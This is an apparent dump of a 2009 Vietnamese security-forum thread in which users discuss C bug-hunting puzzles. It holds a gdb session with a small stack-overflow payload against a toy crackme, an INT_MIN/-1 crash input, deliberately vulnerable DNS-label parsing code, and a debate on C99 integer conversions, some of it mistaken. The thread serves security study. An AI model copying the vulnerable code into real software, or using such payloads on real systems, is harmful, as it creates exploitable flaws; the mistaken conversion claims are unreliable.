0xbffff6c0:     0xf5    0x85    0x04    0x08    0xdc    0xf6    0xff    0xbf
0xbffff6c8:     0x0a    0xf9    0xff    0xbf    0xaa    0x9d    0xea    0xb7
0xbffff6d0:     0xa4    0xd1    0xfd    0xb7    0x35    0xa6    0xea    0xb7
0xbffff6d8:     0xe8    0xf6    0xff    0xbf    0x41    0x41    0x41    0x41
0xbffff6e0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
(gdb) run<font color='yellow'> `python -c 'print "\x90" * 15 + "\xcc" + "\xdc\xf6\xff\xbf"'`</font>
Starting program: /home/twilight/crackme.de/choc/bai4 `python -c 'print "\x90" * 15 + "\xcc" + "\xdc\xf6\xff\xbf"'`

Breakpoint 1, 0x080484dd in func ()
(gdb) continue 
Continuing.
Hello, �����������������
<font color='yellow'>
Program received signal SIGTRAP, Trace/breakpoint trap</font>.
0xbffff6ec in ?? ()
(gdb)


&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171020</guid>
				<link>/hvaonline/posts/list/27801.html#171020</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 18:59:42]]> GMT</pubDate>
				<author><![CDATA[ twilight]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">TQN wrote:</cite><br>
		<blockquote>Tui đọc tới đọc lui, đọc xuôi đọc ngược mà chả thấy bài 2 có bug gì cả. Đại ca _choc chỉ giùm em đi. Làm sao mà nó crash được, hay vậy ?&nbsp;
		</blockquote>
Lỗi thì thấy rõ mà anh, nhưng yêu cầu của choc_ là crash
để kiểm chứng lỗi tràn số nguyên khi return, có thể làm như sau
<blockquote> #include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 
 int main(int argc, char **argv)
 {
     int x, y, z;
     if (argc != 3)
         return 0;
     x = atoi(argv[1]);
     y = atoi(argv[2]);
   <font color='yellow'>  z = y?x/y:0;</font>
<font color='yellow'>printf("z=%d",z);</font>
return z;
 }&nbsp;
		</blockquote>
Trong đó dòng tô đậm là em thêm vào:
kiểu singed int có bound từ -2147483648 --&gt; 2147483647

kiểm chứng lỗi
<blockquote>twilight@h4x0r:~/crackme.de/choc$ ./bai2 <font color='yellow'>2147483647</font> 1
<font color='yellow'>z=2147483647</font>
twilight@h4x0r:~/crackme.de/choc$ ./bai2 <font color='yellow'>2147483648</font> 1
<font color='yellow'>z=2147483647</font>&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171029</guid>
				<link>/hvaonline/posts/list/27801.html#171029</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 19:23:39]]> GMT</pubDate>
				<author><![CDATA[ twilight]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">twilight wrote:</cite><br>
		<blockquote>kiểm chứng lỗi
<blockquote>twilight@h4x0r:~/crackme.de/choc$ ./bai2 <font color='yellow'>2147483647</font> 1
<font color='yellow'>z=2147483647</font>
twilight@h4x0r:~/crackme.de/choc$ ./bai2 <font color='yellow'>2147483648</font> 1
<font color='yellow'>z=2147483647</font>&nbsp;
		</blockquote>&nbsp;
		</blockquote>
Cái này đâu phải lỗi. Spec của hàm atoi có ghi rõ mà: nếu số được parse ngằm ngoài vùng cho phép thì nó sẽ trả về MIN_INT hoặc MAX_INT.
Ở đây 2147483648 nằm ngoài vùng của signed int nên bản thân atoi nó đã trả về là 2147483647 rồi chứ không phải là "lỗi" tràn số. Do vậy z = 2147483647 là đúng (vì atoi trả về 2147483647 cho x).]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171033</guid>
				<link>/hvaonline/posts/list/27801.html#171033</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 19:34:01]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @twilight: bài số 4 chỉ là lừa bịp thôi :-p. Bài đó để minh chứng cho cái ý "thấy vậy mà không phải vậy" khi nhìn vào source code.

Về bài số 2, thì như bạn nbthanh nói, vấn đề mà bạn đưa ra không phải là lỗi của chương trình. Nhưng mà cái ý của bạn thì cũng gần đúng rồi đó.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171037</guid>
				<link>/hvaonline/posts/list/27801.html#171037</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 20:18:52]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[  Bài 2 :
 Divide INT_MIN by -1 cause DDOS .
<blockquote>$ ./a.out -2147483648 -1&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171073</guid>
				<link>/hvaonline/posts/list/27801.html#171073</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 01:59:10]]> GMT</pubDate>
				<author><![CDATA[ 0SAT0]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">0SAT0 wrote:</cite><br>
		<blockquote> Bài 2 :
 Divide INT_MIN by -1 cause DDOS .
<blockquote>$ ./a.out -2147483648 -1&nbsp;
		</blockquote>&nbsp;
		</blockquote>
Aha, sao lại quên nghĩ đến điểm này :-)
Signed number, ví dụ với int thì là -2147483648 đến +2147483647
Do vậy khi đảo dấu của -2147483648 thì sẽ thành +2147483648 --&gt; out of range.

Tuy nhiên lỗi này gây ra do phép chia chứ chưa đến "công đoạn" return như choc_ gợi ý?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171075</guid>
				<link>/hvaonline/posts/list/27801.html#171075</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 02:07:24]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">0SAT0 wrote:</cite><br>
		<blockquote> Bài 2 :
 Divide INT_MIN by -1 cause DDOS .
<blockquote>$ ./a.out -2147483648 -1&nbsp;
		</blockquote>&nbsp;
		</blockquote>
Aha, sao lại quên nghĩ đến điểm này :-)
Signed number, ví dụ với int thì là -2147483648 đến +2147483647
Do vậy khi đảo dấu của -2147483648 thì sẽ thành +2147483648 --&gt; out of range.

Tuy nhiên lỗi này gây ra do phép chia chứ chưa đến "công đoạn" return như choc_ gợi ý?&nbsp;
		</blockquote>
Nhưng mà nó cứ crash là được rồi còn gì.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171085</guid>
				<link>/hvaonline/posts/list/27801.html#171085</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 07:50:18]]> GMT</pubDate>
				<author><![CDATA[ StarGhost]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @0SATO: đáp án thì đúng nhưng lời giải thì không chấp nhận được :-p. Mình ngờ là bạn tìm thấy đáp án này trên Internet.

@nbthanh: gợi ý là suy nghĩ ban đầu của mình về nguyên nhân gây ra lỗi (mình phát hiện ra lỗi này bằng cách fuzzing với mấy con số may mắn của mình như INT_MIN, UINT_MAX, INT_MAX, -1, 0x80000000...). Ban đầu mình nghĩ là a/b sẽ trả về một giá trị kiểu float, rồi giá trị này sẽ bị ép thành int nên gây ra lỗi.

Sau khi gửi gợi ý lên, mình mới phát hiện ra là suy nghĩ của mình sai rồi. Khi mà cả hai operand đều là integer thì C sẽ thực hiện phép chia integer, kết quả trả về phải là một số int. Mà lúc đó forum lại không cho sửa bài, nên mình không sửa lại được.

Tiếp tục đi các bạn. Hôm nay mình sẽ gửi tiếp một số bài.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171088</guid>
				<link>/hvaonline/posts/list/27801.html#171088</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 10:08:11]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @choc_: thì mình chép lại mà :D
Trình độ còn gà nên chỉ chép lại chứ chưa phân tích dc như nbthanh :))
Mọi người cứ chơi tiếp đi . Bye bye :D]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171090</guid>
				<link>/hvaonline/posts/list/27801.html#171090</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 10:13:57]]> GMT</pubDate>
				<author><![CDATA[ 0SAT0]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ lolz, ức chế wóa :-j
<span class="link"> /hvaonline/jforum.html?module=moderation&action=moreWarn&topic_id=28554&post_id=176059&uid=1706&warned_by=gamma95&token=500c87b4ef34e1df6321d349dd21f273</span>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171120</guid>
				<link>/hvaonline/posts/list/27801.html#171120</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 12:05:09]]> GMT</pubDate>
				<author><![CDATA[ twilight]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ À, thì ra là vậy. Hay thật.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171124</guid>
				<link>/hvaonline/posts/list/27801.html#171124</link>
				<pubDate><![CDATA[Thu, 26 Feb 2009 12:28:27]]> GMT</pubDate>
				<author><![CDATA[ lamer]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Bài 7: xử lý Pascal string dạng như 9hvaonline3net0 (đây là dạng DNS domain name trong DNS packet, bài này ông thầy mình nói là sửa lại từ một real world vuln).

Để chạy thử theo đúng ý đồ của chương trình, các bạn phải nhập vào một Pascal string có dạng như sau: mỗi phần trong domain name sẽ được bắt đầu bằng một byte đánh dấu độ dài của nó; domain name kết thúc khi gặp một phần có độ dài là 0. Ví dụ như domain vnhacker.org thì các bạn phải nhập như sau:

<blockquote>
./puzzle7 "`python -c 'print "\x08" + "vnhacker" + "\x03" + "org" + "\x00"'`"
your domain is: vinagame.com
&nbsp;
		</blockquote>

Nói cách khác, để chỉ ra lỗi bài này, trước tiên các bạn phải giả sử là domain name nhập vào chắc chắn phải theo format này, tự vì các bạn nhập khác đi, chương trình nó sẽ chạy bị lỗi.

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define MAX_LEN 256

char* get_domain&#40;char* input&#41; {
   int c;
   char name&#91;MAX_LEN&#93;;
   memset&#40;name, '\0', sizeof&#40;name&#41;&#41;;
   c = &#40;char&#41;*input;
   while &#40;c&#41; {
      if &#40; strlen&#40;name&#41; + c &lt; &#40;MAX_LEN - 1&#41; &#41; {
          &#40;char *&#41;input++;
          strncat&#40;name, &#40;char *&#41;input, c&#41;;
          input += c;          
          c = &#40;char&#41;*input;
          strcat&#40;name, "."&#41;;
      } else {
          fprintf&#40;stderr, "something wrong happened!\n"&#41;;
          c = 0;
      }
   }
   name&#91;strlen&#40;name&#41;-1&#93; = '\0';
   return name;
}

int main&#40;int argc, char **argv&#41; {
   if &#40;argc != 2&#41; 
      exit&#40;0&#41;;   
   char* domain = &#40;char *&#41; get_domain&#40;argv&#91;1&#93;&#41;;
   printf&#40;"your domain is: %s\n", domain&#41;;
   return 0;
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171253</guid>
				<link>/hvaonline/posts/list/27801.html#171253</link>
				<pubDate><![CDATA[Fri, 27 Feb 2009 03:47:50]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @OSato: ý là bạn nói đi tìm lỗi của những bài này là vô ích, bởi trong thực tế, nó phức tạp hơn nhiều? 

Ờ thì tại mình nghĩ mình dốt, nên ráng tập làm mấy cái đơn giản này trước. Gặp cái nào khó quá, không làm được thì mình đành tìm trên Google xem bọn nó giải thế nào, rồi gửi lên đây lấy le vậy. Gì chứ mình xài Google tốt lắm.

À mà nói nhiều làm chi, chắc bạn OSATO toàn chơi cỡ mấy bài trên Phrack, nên mình dại mồm dại miệng nhờ bạn giải giùm mình bài số 7. Ông thầy cho về nhà từ học kỳ trước mà tới giờ mình vẫn chưa giải được. Ối bạn đừng chê nó đơn giản quá nên không thèm làm nha, mình tủi thân lắm huhuhu.

@rest: Nhân dịp...hết tháng 2, mình tặng tất cả các bạn một câu thế này của Mark Twain: 

<p></p>
		<cite class="blockquote">Mark Twain wrote:</cite><br>
		<blockquote>
It is better to keep your mouth shut and let people think you are a fool than to open it and remove all doubt.
&nbsp;
		</blockquote>

]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171394</guid>
				<link>/hvaonline/posts/list/27801.html#171394</link>
				<pubDate><![CDATA[Sat, 28 Feb 2009 02:42:56]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[  Hic, sorry :( mình hok hề có ý đó , mình có giải ra đâu , chỉ có điều mình đã nói kĩ đó là ý kiến cá nhân mình .
 Chả dám chê ai hay coi thường ai cả , chắc lời lẽ hơi quá đáng , một lần nữa xin lỗi bạn . Mình sẽ xóa bài để ko làm hỏng topic của bạn . 
À chắc bạn học ở trường ngoài nước rồi , mình chỉ học ở một trường ở Việt Nam , hok dạy security nên chắc trình độ còn thua xa bạn lắm , mình thường coi ké giáo trình ở các trường khác và thèm muốn :( . 
Cuối cùng : mình hok giỏi english cho lắm , cái câu bạn nói mình hiểu sơ sơ , hình như bạn đang nói mình thì phải :( 
Thôi xóa bài .
À quên , mình có coi vài bài của bạn , mình hok thích cách nói chuyện của bạn lắm , bạn giỏi nhưng cũng đừng coi thường người khác quá , mà trong topic này cũng thế , bài trả lời mình vừa rồi ,bạn than vãn nhưng là đang chửi bới mình chứ gì :D Thôi tùy , ăn nói sâu xa quá mệt óc lắm . Mà bài số 7 bạn nhờ mình giải đâu nhỉ ? mình có thấy đâu :( Cái kiểu cứ nâng người ta lên để đạp người ta xuống nghe thì nó ngọt ngào dễ chịu lắm nhưng mà mình thấy nó chát ngắt thế nào ây gì mà ừ thì mình dốt rồi mình google lấy lệ :) ...... , thấy nó abczyx lắm lận :(
Mình hok làm những bài này hok phải vì nghĩ đơn giản mà theo mình hack = change + creative . Còn những cái bài thế này là một cách rập khuôn , thế này đi , mình có một nhóm , tất cả cùng ngồi lại lọc ra các function có nguy cơ cao (theo cái development guide trên kia) rồi ở mỗi function xem nó có bao nhiêu cách khai thác , và tiếp tục bàn bạc xem khai thác ở điểm nào thì được :D theo bạn thì một nhóm hơn chục con ngừoi , có thể tìm ra lỗi ở function nào và làm sao attack nó ko ? Nếu không dc thì mình sẽ thử cùng nhóm giải quyết các bài này . Còn nếu bạn nghĩ là dc thì ......]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171397</guid>
				<link>/hvaonline/posts/list/27801.html#171397</link>
				<pubDate><![CDATA[Sat, 28 Feb 2009 03:09:47]]> GMT</pubDate>
				<author><![CDATA[ 0SAT0]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>
<p></p>
		<cite class="blockquote">Mark Twain wrote:</cite><br>
		<blockquote>
It is better to keep your mouth shut and let people think you are a fool than to open it and remove all doubt.
&nbsp;
		</blockquote>

&nbsp;
		</blockquote>
Hơ hình như cụ Mark Twain chôm câu này của... mình. :P 

Đùa chứ tớ cũng không tưởng là người ta dạy cái này ở trường ĐH. Không biết bạn <b>choc_</b> học ở đâu, chắc là trường này phải specialize về security lắm mới dạy những cái này, có thể giới thiệu cho tớ không (pm cũng được)? Tớ trước cũng chỉ mon men 1 tí về shellcode nhưng sau không có nhiều time nữa nên bỏ giữa chừng.

Thân.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171401</guid>
				<link>/hvaonline/posts/list/27801.html#171401</link>
				<pubDate><![CDATA[Sat, 28 Feb 2009 06:02:44]]> GMT</pubDate>
				<author><![CDATA[ StarGhost]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Bài 7: xử lý Pascal string dạng như 9hvaonline3net0 (đây là dạng DNS domain name trong DNS packet, bài này ông thầy mình nói là sửa lại từ một real world vuln).

Để chạy thử theo đúng ý đồ của chương trình, các bạn phải nhập vào một Pascal string có dạng như sau: mỗi phần trong domain name sẽ được bắt đầu bằng một byte đánh dấu độ dài của nó; domain name kết thúc khi gặp một phần có độ dài là 0. Ví dụ như domain vnhacker.org thì các bạn phải nhập như sau:

<blockquote>
./puzzle7 "`python -c 'print "\x08" + "vnhacker" + "\x03" + "org" + "\x00"'`"
your domain is: vinagame.com
&nbsp;
		</blockquote>

Nói cách khác, để chỉ ra lỗi bài này, trước tiên các bạn phải giả sử là domain name nhập vào chắc chắn phải theo format này, tự vì các bạn nhập khác đi, chương trình nó sẽ chạy bị lỗi.&nbsp;
		</blockquote>
Không biết "khác" là khác như thế nào? Giả sử như format vẫn đúng, nhưng input là thế này: '0xff' + "1" + '0x00' (tức chỉ định độ dài là 255 nhưng trên thực tế chỉ đưa vào có 1 ký tự) là có chuyện ngay :-)

Nếu trên môi trường char là unicode 16 bit: '0xffff' + "...."
Còn nếu trên môi trường char là 1 byte thì strlen() trả về size_t, còn c là 1 byte thì strlen(name) + c sẽ trả về int hay short int? Chưa biết được vì còn phụ thuộc vào môi trường và compiler.
Trong khi đó MAX_LEN - 1 sẽ là kiểu int hay short int? Cũng...tùy vào compiler luôn :-)]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171409</guid>
				<link>/hvaonline/posts/list/27801.html#171409</link>
				<pubDate><![CDATA[Sat, 28 Feb 2009 10:37:10]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote>

Không biết "khác" là khác như thế nào? Giả sử như format vẫn đúng, nhưng input là thế này: '0xff' + "1" + '0x00' (tức chỉ định độ dài là 255 nhưng trên thực tế chỉ đưa vào có 1 ký tự) là có chuyện ngay smilie
&nbsp;
		</blockquote>

Chỉ cần đúng format là được (1 byte length + label + 1 byte length + label...). Còn lại các field khác ra sao cũng được. Cách đưa input của bạn là đúng rồi đó, vấn đề là giải thích tại sao lại "có chuyện".
 
<p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote>
Nếu trên môi trường char là unicode 16 bit: '0xffff' + "...."
&nbsp;
		</blockquote>

Mình nhớ đọc trong C99 thì kích thước của các type đều là implementation-defined nhưng mà mình không biết có môi trường nào mà char là 2 byte. Tất cả các môi trường mà mình biết thì đều có char là 1 byte. Nhờ bạn nbthanh đưa vài ví dụ môi trường mà char là 2 byte.

<p></p>
		<cite class="blockquote">nbthanh wrote:</cite><br>
		<blockquote>
Còn nếu trên môi trường char là 1 byte thì strlen() trả về size_t, còn c là 1 byte thì strlen(name) + c sẽ trả về int hay short int? Chưa biết được vì còn phụ thuộc vào môi trường và compiler.
Trong khi đó MAX_LEN - 1 sẽ là kiểu int hay short int? Cũng...tùy vào compiler luôn 
&nbsp;
		</blockquote>&nbsp;
		</blockquote>

Mình nghĩ kiểu của biểu thức <b>strlen(name) + c</b> đã được quy định rất rõ trong C99, nó không phụ thuộc vào môi trường và compiler. Đối với MAX_LEN -1, sau bước preprocessing, nó sẽ trở thành 256 - 1, trong đó 256 và 1, theo quy định của C99, có kiểu là int, nên MAX_LEN - 1 sẽ có kiểu là int.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171565</guid>
				<link>/hvaonline/posts/list/27801.html#171565</link>
				<pubDate><![CDATA[Sun, 1 Mar 2009 18:06:19]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Các bạn có thể download C99 ở đây: http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171566</guid>
				<link>/hvaonline/posts/list/27801.html#171566</link>
				<pubDate><![CDATA[Sun, 1 Mar 2009 18:34:37]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Để chứng minh cho luận điểm của là MAX_LEN - 1 sẽ có kiểu là int, mình mời các bạn biên dịch và chạy đoạn chương trình sau, rồi giải thích giùm mình chuyện gì đã xảy ra:

Bài 8:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define MAX_LEN 0

int main&#40;int argc, char **argv&#41; {
   unsigned int i = 1;

   if &#40;i &lt; &#40;MAX_LEN - 1&#41;&#41; {
       printf&#40;"this can not happen, can it?\n"&#41;;
   }

   return 0;    
}</pre>
		</div>

]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171568</guid>
				<link>/hvaonline/posts/list/27801.html#171568</link>
				<pubDate><![CDATA[Sun, 1 Mar 2009 19:09:44]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Để chứng minh cho luận điểm của là MAX_LEN - 1 sẽ có kiểu là int, mình mời các bạn biên dịch và chạy đoạn chương trình sau, rồi giải thích giùm mình chuyện gì đã xảy ra:

Bài 8:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define MAX_LEN 0

int main&#40;int argc, char **argv&#41; {
   unsigned int i = 1;

   if &#40;i &lt; &#40;MAX_LEN - 1&#41;&#41; {
       printf&#40;"this can not happen, can it?\n"&#41;;
   }

   return 0;    
}</pre>
		</div>

&nbsp;
		</blockquote>
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define MAX_LEN 256

int main&#40;int argc, char **argv&#41;
{
        int i;
        char c;

        i = MAX_LEN-10;
        c = MAX_LEN-10;
        printf&#40;"%d %d\n", i, c&#41;;
        return 0;
}</pre>
		</div>

Kết quả in ra 246 và -10 (còn nếu unsigned char thì in ra 246 và 246)
ASM code được sinh ra khi turn off optimization có đoạn sau (trong cả 2 trường hợp unsigned char và char)
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>movl    $246, -12&#40;%ebp&#41;
movb    $-10, -5&#40;%ebp&#41;</pre>
		</div>

Như vậy kết luận là ở câu lệnh c = MAX_LEN-10:
- MAX_LEN đã được convert thành char --&gt; tràn số ==&gt; là 0
- MAX_LEN - 10 được xử lý luôn ở bước preprocessing: 0 - 10 = -10

Vậy thì MAX_LEN - 1 là char hay int thì tùy vào ngữ cảnh (và có thể là do compiler luôn).

P/S: mới check lại tài liệu, kiểu "char" trong C/C++ thì luôn là 1 byte :-)]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171602</guid>
				<link>/hvaonline/posts/list/27801.html#171602</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 01:43:14]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @nbthanh: mình nghĩ bạn nên đọc C99 đi, tự vì trong đó nó nói hết tại sao bạn lại quan sát được như thế. Và rất tiếc là C99 nó nói khác với cách hiểu của bạn.

Thật tế với ví dụ của bạn, không cần phải compile rồi chạy, mình cũng có thể tính được giá trị của hai biến i và c, thông qua các luật chuyển đổi trong C99.

Như mình đã nói ở một bài ở trên, MAX_LEN, sau bước preprocessing, trở thành 256, và sẽ được xem như là một integer constant. Để tính kiểu cho một integer constant, thì C99 (các chuẩn trước đó thì hình như chưa có luật n), sẽ tìm chọn từ trên xuống dưới, bắt đầu bằng int (rồi long int, rồi long long int...), xem kiểu nào có thể lưu giá trị của integer constant đó. Ở trường hợp này, do MAX_LEN là 256, nên kiểu được chọn là int. Sở dĩ C99 không chọn kiểu nhỏ hơn, ví dụ như char hay short, bởi vì các kiểu này, sau đó cũng sẽ bị đổi sang int, do phép biến đổi integer promotion.

Biểu thức 256 - 10 là một biểu thức số học nhị phân, nên việc tính kiểu cho nó sẽ tuân theo nhóm luật gọi là usual arithmetic conversion. Ở đây mình có hai cái operand cùng kiểu int, nên không cần phải chuyển đổi gì thêm nữa, biểu thức này sẽ có kiểu là int. Trong C99 cũng có nói, int là signed hay unsigned là implementation-defined, và thông thường thì nó sẽ là signed.

Rồi bây giờ nói đến hai trường hợp cụ thể mà bạn nbthanh quan sát được. Trong trường hợp i = MAX_LEN - 10, do i được khai báo là int, cùng kiểu với MAX_LEN - 10, nên giá trị của MAX_LEN - 10 sẽ được gán cho i mà không cần phải chuyển đổi gì nữa. Trong trường hợp c = MAX_LEN - 10, do c là char, nên khi gán thế này, một phép biến đổi từ int sang char (mà C99 gọi là simple conversion) sẽ diễn ra: số int sẽ bị truncated, chỉ lấy 8 bit cuối của số int này, và gán cho số char.

Xét 8 bit cuối của số 246 = MAX_LEN - 10: 1111 0110. 8 bit này là dạng biểu diễn lưu trên máy tính của c. Tương tự, như trường hợp int, char là signed hay unsigned là implementation-defined, và thông thường là signed. Nghĩa là muốn tính xem 1111 0110 là biểu diễn của con số bao nhiêu, ta phải lấy bù hai của nó.

Bù một: 0000 1001 
Bù hai: 0000 1010 = 10

Như vậy 1111 0110 là biểu diễn của giá trị là -10. Điều này giải thích tại sao bạn nbthanh thấy giá trị này. Kết luận là gì: kiểu của MAX_LEN - 1 hoàn toàn xác định được bằng cách luật của C99, mà không phụ thuộc vào ngữ cảnh hay compiler.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171609</guid>
				<link>/hvaonline/posts/list/27801.html#171609</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 02:50:28]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Mình nghĩ những tranh luận ở đây thể hiện rất rõ lý do tại sao mình gửi mấy bài này lên đây: ngay cả người đã làm C/C++ nhiều năm vẫn có thể không hiểu rõ cách mà C/C++ xử lý các con số. Mà không chỉ trong C/C++, vấn đề này cũng lập lại ở các ngôn ngữ như Java hay C#. Nên mình có lời khuyên là bạn nào viết code để sống thì nên tìm hiểu kỹ những câu hỏi này, xem mình có thật sự hiểu rõ chuyện gì xảy ra hay không.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171610</guid>
				<link>/hvaonline/posts/list/27801.html#171610</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 03:06:06]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Đồng tình với choc_ vụ làm nhiều năm với C/C++ mà vẫn khó rõ ngọn ngành nếu không đào sâu gốc rễ. Đọc những tranh luận trên đây quả là thú vị và đáng học hỏi :-)

Vụ  if (i &lt; (MAX_LEN - 1)) ... theo tui hiểu thì đơn giản, vì i được khai báo unsigned int (range từ 0 - 4,294,967,295), MAX_LEN - 1 bằng -1 hay 0xffffffff, khi so sánh nó type cast cả 2 phía về unsigned thì đương nhiên vế phải sẽ lớn hơn.

BTW. Đọc tiêu đề thấy "chương trình C" sao nhiều tranh luận vẫn lôi "C++" ra nhỉ.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#171612</guid>
				<link>/hvaonline/posts/list/27801.html#171612</link>
				<pubDate><![CDATA[Mon, 2 Mar 2009 04:25:46]]> GMT</pubDate>
				<author><![CDATA[ Z0rr0]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Kết luận là gì: kiểu của MAX_LEN - 1 hoàn toàn xác định được bằng cách luật của C99, mà không phụ thuộc vào ngữ cảnh hay compiler.&nbsp;
		</blockquote>
Đoạn code được tôi compile bằng gcc (4.2.4).
Tôi compile với -O0 để tắt hết các "side effect" của compiler optimization. Kết quả mã ASM như sau:

i = MAX_LEN-10;
--&gt; <b>movl</b>    $246, -12(%ebp)
(điều này hợp lý vì sizeof(int) trả về 4 trên system này).

c = MAX_LEN-10
--&gt; <b>movb</b>    $-10, -5(%ebp)

